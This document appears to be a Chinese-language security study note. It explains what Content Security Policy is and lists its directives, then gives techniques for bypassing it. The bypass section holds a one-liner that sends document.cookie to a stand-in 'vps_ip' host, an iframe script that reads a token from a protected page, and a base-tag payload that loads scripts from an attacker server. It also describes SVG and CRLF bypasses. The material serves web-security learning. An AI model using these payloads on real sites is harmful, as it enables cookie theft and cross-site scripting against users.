- [CSP(Content Security Protect)](#cspcontent-security-protect)
  - [基础](#基础)
  - [作用](#作用)
  - [配置](#配置)
    - [常见策略](#常见策略)
  - [CSP Bypass](#csp-bypass)
    - [数据带外](#数据带外)
    - [Iframe绕过](#iframe绕过)
      - [CDN绕过](#cdn绕过)
      - [站点可控](#站点可控)
      - [Base-uri绕过](#base-uri绕过)
      - [SVG绕过](#svg绕过)
      - [CRLF绕过](#crlf绕过)
- [参考](#参考)

# CSP(Content Security Protect)
## 基础
内容安全策略（CSP）用于检测和减轻用于 Web 站点的特定类型的攻击，例如 XSS (en-US) 和数据注入等。   
该安全策略的实现基于一个称作 Content-Security-Policy 的 HTTP 首部。
## 作用
* 缓解XSS：  
CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来源，一个 CSP 兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本（包括内联脚本和 HTML 的事件处理属性）。
* 缓解数据包嗅探攻击：  
服务器还可指明哪种协议允许使用；比如（从理想化的安全角度来说），服务器可指定所有内容必须通过 HTTPS 加载。一个完整的数据安全传输策略不仅强制使用 HTTPS 进行数据传输，也为所有的 cookie 标记 secure 标识，并且提供自动的重定向使得 HTTP 页面导向 HTTPS 版本。网站也可以使用 Strict-Transport-Security HTTP 标头确保连接它的浏览器只使用加密通道。

## 配置
开启CSP，需要配置网络服务器返回`Content-Security-Policy HTTP `标头（旧版本使用 X-Content-Security-Policy 标头。  
除此之外，<meta> 元素也可以被用来配置该策略，例如
```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src https://*; child-src 'none';" />
```
### 常见策略
*  default-src：默认策略
*  child-src：为 Web Workers 和其他内嵌浏览器内容（例如用 `<frame>` 和 `<iframe>` 加载到页面的内容）定义合法的源地址。   
警告： 如果开发者希望管控内嵌浏览器内容和 web worker 应分别使用 frame-src (en-US) 和 worker-src 指令，来相对的取代 child-src。  

* connect-src：限制能通过脚本接口加载的 URL。  

* default-src：为其他取指令提供备用服务 fetch directives。  

* font-src：设置允许通过 @font-face 加载的字体源地址。

* frame-src (en-US)：设置允许通过类似 `<frame>` 和 `<iframe>` 标签加载的内嵌内容的源地址。

* img-src (en-US)：img-src：限制图片和图标的源地址。

* manifest-src (en-US)：限制应用声明文件的源地址。

* media-src (en-US)：限制通过 `<audio>`、`<video>` 或 `<track>`标签加载的媒体文件的源地址。

* object-src (en-US)：限制 `<object>` 或 `<embed>` 标签的源地址。  
备注： 被 object-src 控制的元素可能碰巧被当作遗留 HTML 元素，导致不支持新标准中的功能（例如 `<iframe>` 中的安全属性 sandbox 和 allow）。因此建议限制该指令的使用（比如，如果可行，将 object-src 显式设置为 'none'）。

* prefetch-src (en-US)：指定预加载或预渲染的允许源地址。

* script-src (en-US)：限制 JavaScript 的源地址。

* style-src (en-US)：限制层叠样式表文件源。

* webrtc-src：实验性指定WebRTC连接的合法源地址。

* worker-src：限制 Worker、SharedWorker 或 ServiceWorker 脚本源。
## CSP Bypass
### 数据带外
CSP不影响location.href跳转，利用location.href来将数据传出。  
`location.href = "vps_ip:xxxx?"+document.cookie`
### Iframe绕过
当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom。  
A页面:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">

<h1 id="token">xxxxx</h1>
```
B页面:
```html
<body>
<script>
var iframe = document.createElement('iframe');
iframe.src="A页面";
document.body.appendChild(iframe);
setTimeout(()=>alert(iframe.contentWindow.document.getElementById('token').innerHTML),1000);
</script>
</body>
```
#### CDN绕过
由于一些低版本的框架，就可能存在绕过CSP的风险。  
CDN服务商存在某些低版本的js库且此CDN服务商在CSP白名单中，
可以被用来绕过CSP的一些JS库：  
https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
#### 站点可控
CSP设置的可信来源站点存在可控的静态资源，导致绕过。
#### Base-uri绕过
当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用`<base>`标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径。
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-test'">
<base href="//vps_ip/">
<script nonce='test' src="test.js"></script>
```
#### SVG绕过
SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss。
#### CRLF绕过
当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP。
# 参考
https://developer.mozilla.org/zh-CN/docs/Glossary/CSP  
https://xz.aliyun.com/t/5084  
https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf